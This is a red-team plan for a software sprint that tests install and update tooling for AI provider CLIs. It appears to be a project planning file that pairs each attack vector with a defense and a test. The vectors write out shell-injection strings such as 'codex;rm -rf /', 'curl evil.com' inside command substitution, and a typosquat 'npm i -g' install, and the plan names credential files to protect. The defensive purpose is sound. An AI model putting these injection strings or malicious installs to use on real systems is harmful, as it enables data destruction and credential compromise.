# Red-Team Plan — WarpOS install/update provider smoke test + RCA

**Sprint:** `SP-20260513-002`
**PRD:** `C:\Users\Vladislav Zhirnov\Desktop\Claude\Projects\WarpOS\.claude\project\sprint\requirements\SP-20260513-002\prd.md`

> Adversarial review plan. Diff-model review on redteam is declared in
> `paths.sprintRouting` (`redteam.diff_review: true`). Sprint v0.1 ships
> the checklist; downstream projects extend with project-specific
> personas via `/redteam:full`.

## Threat classes to cover

- [ ] Authentication / authorization bypass
- [ ] Input validation / injection
- [ ] Business-logic abuse (multi-step exploits)
- [ ] Secrets exposure (env vars, logs, error messages)
- [ ] External service abuse (ESD-related credential or quota misuse) — N/A no new ESDs
- [ ] Approval-boundary bypass (executing approval-required work without an approval)
- [ ] State-of-the-world bypass (acting on stale tracker state)
- [ ] Prompt-injection of the agent loop itself (sprint commands, Plan Contract content)

## Per-sprint additions

### RT-1 — Malicious provider name in `--providers` list

**Vector:** Operator (or a hostile capsule's `postUpdateChecks` entry) passes `--providers "codex;rm -rf /"` or `--providers "gemini && curl evil.com"`.
**Defense:** IN-1 validation regex `/^[a-z][a-z0-9_-]{1,31}$/` plus a known-providers allowlist. The CSV parser must split on `,` ONLY (no shell metachars passed through). Orchestrator MUST exit 1 with `unknown_provider` (no probe attempted).
**Test:** Feed adversarial tokens. Assert orchestrator exits 1 with the expected stderr. Assert no `execSync` call was made.

### RT-2 — RCA fix that corrupts auth (the founder rejection risk)

**Vector:** A catalog entry with `safe_to_autofix: true` whose recipe touches `~/.gemini/settings.json`, `~/.codex/auth.json`, `~/.aws/credentials`, or `GEMINI_API_KEY` env in `.bashrc`/`.profile`. Operator's authenticated session silently changes.
**Defense:** Catalog policy — every recipe that mutates a file or env var under `os.homedir()/(.gemini|.codex|.openai|.aws|.config)/` MUST be `safe_to_autofix: false`. Enforced by a unit test that scans the catalog's `fix_recipe` strings for `homedir` / `~/.` / `process.env` writes and asserts those entries are gated.
**Test:** Static lint over `provider-failure-modes.json#entries[*]`. AC-5.2 covers the `auth_source_mismatch` case specifically.

### RT-3 — Retry storm under network flap

**Vector:** Operator's network drops every 2s. Smoke probes time out. RCA classifies `provider_timeout` (catalog policy: `safe_to_autofix: true`, recipe = retry once). Each retry also times out. If the orchestrator loops, every install/update kicks off N retries × M providers × P probes.
**Defense:** R-5 cycle prevention — autofix runs at most ONCE per provider per smoke invocation. Re-probe count is hard-coded to 1 in `provider-autofix.js`. No env override.
**Test:** Inject a probe that always returns `provider_timeout`. Assert at most 1 retry per provider, total smoke wall-clock < 30s, no recursive call to autofix.

### RT-4 — Prompt injection via capsule's release.json

**Vector:** A malicious capsule includes a `postUpdateChecks` entry like `node scripts/warpos/provider-smoke.js --providers $(curl evil.com)`. `/warp:update` happens to use a shell that does command substitution.
**Defense:** `update.js` already validates `postUpdateChecks` entries (per audit map). For SP-002, every entry we ADD to release.json is a literal static string; we do not introduce variable interpolation. Capsule signing (separate concern — out of scope) is the upstream defense for malicious capsules generally.
**Test:** Static review of every release.json edit in this sprint — confirm no shell interpolation tokens.

### RT-5 — Cross-platform binding-gap regression (LRN-2026-04-30)

**Vector:** A future maintainer adds a "fast path" in `provider-smoke.js` that shells out to `cat <file> | codex exec --model X` to save a fork. On Windows this re-introduces the cmd.exe stdin bug AND bypasses `dispatch-route-guard` if the pattern is just slightly different.
**Defense:** Two-layer guard:
1. Source code lint test (AC-8.1) — grep for forbidden patterns in smoke source.
2. Runtime `dispatch-route-guard` continues to block raw codex/gemini exec at the bash-tool layer (AC-8.2).
**Test:** Both ACs. Plus: add `provider-smoke.js` source file to the dispatch-route-guard's protected-file watchlist as a forward signal that smoke is sensitive to this bug class.

### RT-6 — Catalog poisoning via untrusted contribution

**Vector:** A contributor submits a PR adding a new catalog entry with `safe_to_autofix: true` whose `fix_recipe` runs `npm i -g attacker/codex` (a malicious typo-squat) and the reviewer doesn't catch it.
**Defense:** Code review policy + a CI check that any new `fix_recipe` string MUST be reviewed by a CODEOWNER for `.claude/agents/00-alex/.system/policy/`. (Not in this sprint's scope to implement CODEOWNERS, but logging the policy here.)
**Test:** Documented in `release-plan.md` as a release-gate review item.

## Stop-the-bus signals

If any of these surface during redteam, halt `/sprint:execute` and escalate:

- Any path to bypassing approval gates
- Any path to exfiltrating `secret: true` env values from tracker files (smoke must NEVER log `GEMINI_API_KEY`, `OPENAI_API_KEY`, etc. — RCA `detail` field truncates to 400 chars but we must verify no secret leak)
- Any path to running production deploys without approval
- Any path to silently changing TRACE while behavior changes
- Any path to a Ralph loop that doesn't reach a stop condition
- Any path that causes the autofix dispatcher to overwrite a file under `~/.gemini/`, `~/.codex/`, `~/.openai/`, `~/.aws/`, `~/.config/(gemini|codex)/`

## Documentation scaling

This file is mandatory for `documentation_scale: m | l | xl`. For xs/s
it can be a single checklist inlined in the QA plan.
